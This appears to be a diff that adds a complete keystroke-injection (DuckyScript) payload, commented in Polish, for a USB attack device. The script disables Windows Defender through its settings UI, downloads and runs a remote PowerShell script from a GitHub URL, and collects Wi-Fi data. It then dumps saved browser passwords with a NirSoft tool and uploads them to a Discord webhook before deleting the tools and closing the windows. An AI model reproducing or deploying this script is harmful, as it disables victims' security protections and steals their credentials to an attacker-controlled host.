@@ -1,0 +1,67 @@
+REM wylaczanie defendera 
+GUI r
+DELAY 500
+STRING windowsdefender://threat/
+DELAY 400
+ENTER
+DELAY 1500
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 500
+SPACE
+DELAY 800
+REM potwierdzanie przycisku
+LEFT
+DELAY 500
+ENTER
+DELAY 800
+REM payload
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+REM tutaj wklej webhooka z discorda
+STRING $DiscordUrl = 'wklej-go-tu'
+ENTER
+REM tutaj payload w powershellu
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/af39h6q78/mediamarkcik/refs/heads/main/payload.ps1'))
+ENTER
+DELAY 500
+STRING version-av
+ENTER
+STRING Wifi
+ENTER
+STRING Get-Nirsoft
+ENTER
+DELAY 6000
+ENTER
+STRING .\WebBrowserPassView.exe
+ENTER
+DELAY 3000
+CTRL A
+CTRL S
+DELAY 1000
+STRING c:\temp\export.txt
+ENTER
+DELAY 1000
+ALT F4
+DELAY 800
+STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
+ENTER
+STRING Del-Nirsoft-File
+ENTER
+STRING EXIT
+ENTER
+DELAY 1500
+REM zamywanie okien
+SPACE
+DELAY 200
+ALT F4
